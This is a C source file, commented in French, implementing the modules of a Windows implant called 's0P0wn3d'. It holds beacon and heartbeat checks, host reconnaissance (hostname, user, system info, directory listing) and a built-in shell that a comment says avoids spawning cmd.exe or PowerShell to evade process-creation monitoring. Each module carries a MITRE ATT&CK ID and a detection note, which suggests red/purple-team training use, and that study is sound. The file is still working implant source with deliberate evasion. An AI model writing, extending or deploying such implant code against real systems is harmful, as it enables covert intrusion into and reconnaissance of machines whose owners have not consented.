/*
 * s0P0wn3d — Implémentation des modules de l'implant (Windows).
 *
 * Modules Phase 1 : ping, hostname, whoami, cwd, sysinfo, ls, echo, shell
 */

#include "modules.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <lmcons.h>

/* ─── ping ─────────────────────────────────────────────────────────────────── */

static char *mod_ping(const char *args) {
    (void)args;
    return _strdup("pong");
}

/* ─── check (heartbeat/connectivity check) ─────────────────────────────────── */

static char *mod_check(const char *args) {
    (void)args;
    char *response = malloc(256);
    if (response) {
        time_t now = time(NULL);
        snprintf(response, 256, "{\"status\":\"online\",\"timestamp\":%lld}", (long long)now);
    }
    return response ? response : _strdup("{\"status\":\"online\"}");
}

/* ─── hostname ─────────────────────────────────────────────────────────────── */

static char *mod_hostname(const char *args) {
    (void)args;
    char name[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD size = sizeof(name);
    if (GetComputerNameA(name, &size)) {
        return _strdup(name);
    }
    return _strdup("unknown");
}

/* ─── whoami ────────────────────────────────────────────────────────────────── */

static char *mod_whoami(const char *args) {
    (void)args;
    char name[UNLEN + 1] = {0};
    DWORD size = sizeof(name);
    if (GetUserNameA(name, &size)) {
        return _strdup(name);
    }
    return _strdup("unknown");
}

/* ─── cwd ──────────────────────────────────────────────────────────────────── */

static char *mod_cwd(const char *args) {
    (void)args;
    char path[MAX_PATH] = {0};
    DWORD len = GetCurrentDirectoryA(sizeof(path), path);
    if (len > 0 && len < sizeof(path)) {
        return _strdup(path);
    }
    return _strdup("unknown");
}

/* ─── sysinfo ───────────────────────────────────────────────────────────────── */

static char *mod_sysinfo(const char *args) {
    (void)args;
    OSVERSIONINFOEXA osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA((LPOSVERSIONINFOA)&osvi);

    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD hsize = sizeof(hostname);
    GetComputerNameA(hostname, &hsize);

    char username[UNLEN + 1] = {0};
    DWORD usize = sizeof(username);
    GetUserNameA(username, &usize);

    SYSTEM_INFO si = {0};
    GetSystemInfo(&si);

    char *output = malloc(1024);
    if (!output) return _strdup("error: allocation failed");

    const char *arch_str = "unknown";
    switch (si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: arch_str = "x64"; break;
        case PROCESSOR_ARCHITECTURE_INTEL: arch_str = "x86"; break;
        case PROCESSOR_ARCHITECTURE_ARM64: arch_str = "ARM64"; break;
    }

    snprintf(output, 1024,
        "hostname: %s\n"
        "os: Windows %lu.%lu (build %lu)\n"
        "username: %s\n"
        "arch: %s\n"
        "processors: %lu\n"
        "implant_version: %s",
        hostname,
        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
        username,
        arch_str,
        si.dwNumberOfProcessors,
        S0P_VERSION
    );
    return output;
}

/* ─── ls (list directory) ───────────────────────────────────────────────────── */

static char *mod_ls(const char *args) {
    char search_path[MAX_PATH] = {0};
    const char *dir = args && *args ? args : ".";
    snprintf(search_path, sizeof(search_path), "%s\\*", dir);

    WIN32_FIND_DATAA find_data;
    HANDLE hFind = FindFirstFileA(search_path, &find_data);
    if (hFind == INVALID_HANDLE_VALUE) {
        char *err = malloc(256);
        snprintf(err, 256, "error: cannot list %s", dir);
        return err;
    }

    /* Estimer la taille du buffer */
    char *output = malloc(S0P_MAX_OUTPUT);
    if (!output) {
        FindClose(hFind);
        return _strdup("error: allocation failed");
    }
    int offset = 0;

    do {
        const char *type = (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                           ? "[DIR] " : "      ";
        offset += snprintf(output + offset, S0P_MAX_OUTPUT - offset,
                          "%s%s\n", type, find_data.cFileName);
    } while (FindNextFileA(hFind, &find_data) && offset < S0P_MAX_OUTPUT - 256);

    FindClose(hFind);

    if (offset == 0) {
        output[0] = '\0';
    }
    return output;
}

/* ─── echo ──────────────────────────────────────────────────────────────────── */

static char *mod_echo(const char *args) {
    if (!args || !*args) return _strdup("");
    return _strdup(args);
}

/* ─── shell (restricted built-in shell) ─────────────────────────────────────── */
/*
 * Shell restreint utilisant des commandes intégrées uniquement.
 * Ne lance PAS cmd.exe ou powershell.exe — évite la détection par
 * monitoring de création de processus.
 */

static char *mod_shell(const char *args) {
    if (!args || !*args) {
        return _strdup(
            "s0P0wn3d shell v0.1 — commandes intégrées uniquement\n"
            "Commandes disponibles:\n"
            "  help     — affiche cette aide\n"
            "  hostname — nom de la machine\n"
            "  whoami   — utilisateur courant\n"
            "  cwd      — répertoire courant\n"
            "  ls [dir] — liste un répertoire\n"
            "  sysinfo  — informations système\n"
            "  exit     — quitter le shell"
        );
    }

    /* Dispatch vers les modules existants */
    if (strncmp(args, "help", 4) == 0) {
        return mod_shell(NULL); /* afficher l'aide */
    } else if (strncmp(args, "hostname", 8) == 0) {
        return mod_hostname(NULL);
    } else if (strncmp(args, "whoami", 6) == 0) {
        return mod_whoami(NULL);
    } else if (strncmp(args, "cwd", 3) == 0) {
        return mod_cwd(NULL);
    } else if (strncmp(args, "ls", 2) == 0) {
        /* Extraire l'argument après "ls " */
        const char *ls_args = args + 2;
        while (*ls_args == ' ') ls_args++;
        return mod_ls(*ls_args ? ls_args : NULL);
    } else if (strncmp(args, "sysinfo", 7) == 0) {
        return mod_sysinfo(NULL);
    } else if (strncmp(args, "exit", 4) == 0) {
        return _strdup("session ended");
    }

    char *err = malloc(128);
    snprintf(err, 128, "unknown command: %s (type 'help')", args);
    return err;
}

/* ─── Table des modules ────────────────────────────────────────────────────── */

static const module_def_t modules[] = {
    {
        .name = "ping",
        .description = "Vérifie la connectivité de l'implant",
        .mitre_id = "T1010",
        .blue_team_note = "Beacon régulier détectable par analyse de fréquence",
        .execute = mod_ping
    },
    {
        .name = "check",
        .description = "Heartbeat - confirme la présence de l'implant",
        .mitre_id = "T1010",
        .blue_team_note = "Requête régulière de connectivity check - détectable par pattern de timing",
        .execute = mod_check
    },
    {
        .name = "hostname",
        .description = "Retourne le nom d'hôte",
        .mitre_id = "T1592.004",
        .blue_team_note = "Détectable par monitoring des appels GetComputerName",
        .execute = mod_hostname
    },
    {
        .name = "whoami",
        .description = "Retourne l'utilisateur courant",
        .mitre_id = "T1033",
        .blue_team_note = "Détectable par audit des accès aux tokens de processus",
        .execute = mod_whoami
    },
    {
        .name = "cwd",
        .description = "Retourne le répertoire courant",
        .mitre_id = "T1083",
        .blue_team_note = "Détectable par monitoring de GetCurrentDirectory",
        .execute = mod_cwd
    },
    {
        .name = "sysinfo",
        .description = "Retourne les informations système",
        .mitre_id = "T1082",
        .blue_team_note = "Détectable par EDR surveillant GetVersionEx",
        .execute = mod_sysinfo
    },
    {
        .name = "ls",
        .description = "Liste le contenu d'un répertoire",
        .mitre_id = "T1083",
        .blue_team_note = "Détectable par FindFirstFile/FindNextFile",
        .execute = mod_ls
    },
    {
        .name = "echo",
        .description = "Affiche les arguments",
        .mitre_id = "N/A",
        .blue_team_note = "Commande utilitaire sans impact sécurité",
        .execute = mod_echo
    },
    {
        .name = "shell",
        .description = "Shell restreint avec commandes intégrées",
        .mitre_id = "T1059",
        .blue_team_note = "Shell sans spawn de processus — plus difficile à détecter",
        .execute = mod_shell
    }
};

static const int module_count = sizeof(modules) / sizeof(modules[0]);

const module_def_t *modules_get_all(int *count) {
    if (count) *count = module_count;
    return modules;
}

const module_def_t *modules_find(const char *name) {
    for (int i = 0; i < module_count; i++) {
        if (strcmp(modules[i].name, name) == 0) {
            return &modules[i];
        }
    }
    return NULL;
}
